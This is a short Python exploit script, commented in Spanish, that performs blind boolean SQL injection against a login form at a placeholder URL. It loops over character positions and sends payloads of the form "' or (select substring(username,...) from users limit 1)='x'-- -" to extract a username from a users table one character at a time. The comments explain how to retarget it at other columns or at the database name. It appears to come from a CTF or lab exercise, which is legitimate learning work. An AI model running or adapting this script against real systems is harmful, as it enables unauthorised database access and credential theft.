#!/usr/bin/python3

from pwn import *
import requests, pdb, string, signal, sys, time

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://<IP>/<LOGIN>"
characters = string.ascii_lowercase + "-_"

def makeRequest():

	p1 = log.progress("Fuerza bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	username = ""

	p2 = log.progress("Usuario")

	for position in range(1, 20):	#El rango de caracteres que pueda tener el usuario
		for character in characters:
			post_data = {
				'username' : "' or (select substring(username, %d,1) from users limit 1)='%s'-- -" % (position, character),	#Donde pone username de esta linea es el contenido de la tabla que en este caso se llama username que queremos descubrir ya que por defecto la tabla se llama asi, y la otra por defecto para saber en nombre de usuario es name la cual tambien tendriamos que probar, si no supieramos nada de esto, tendriamos que empezar explotando el nombre de la base de datos...
				'password' : 'test'
			}

			p1.status(post_data['username'])

			r = requests.post(login_url, data=post_data)

			if r.text == "1":	#Parametro de la comparacion para saber si es True o False

				username += character
				p2.status(username)
				break

if __name__ == '__main__':

	makeRequest()
